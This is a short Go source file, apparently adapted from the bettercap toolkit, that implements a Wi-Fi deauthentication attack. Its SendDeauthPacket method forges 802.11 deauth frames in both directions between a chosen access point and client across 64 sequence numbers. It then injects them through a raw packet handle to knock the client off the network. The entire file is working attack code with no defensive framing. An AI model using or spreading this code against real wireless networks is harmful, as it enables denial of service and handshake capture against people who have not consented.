/*
*	The code in the following file is an extraction from the bettercap projct
*	ALL CREDID GOES TO THEM
*	Some functions received little modification to fit the need
*	Including creating new function
 */

package wifi_common

import (
	"log"
	"net"
	"time"

	"github.com/bettercap/bettercap/packets"
)

type Deauther struct {
	ApMac     string
	ClientMac string
}

func (mod *WiFiModule) SendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {

	for seq := uint16(0); seq < 64; seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			log.Printf("could not create deauth packet: %s\n", err)
			continue
		} else {
			mod.injectPacket(pkt)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			log.Printf("could not create deauth packet: %s\n", err)
			continue
		} else {

			mod.injectPacket(pkt)
		}
	}
}

func (mod *WiFiModule) injectPacket(data []byte) {

	if err := mod.Handle.WritePacketData(data); err != nil {
		log.Printf("could not inject WiFi packet: %s\n", err)
		//mod.Session.Queue.TrackError()
	} else {
		log.Println(uint64(len(data)))
		log.Println("success")
		//		mod.Session.Queue.TrackSent(uint64(len(data)))
	}
	// let the network card breath a little
	time.Sleep(10 * time.Millisecond)
}
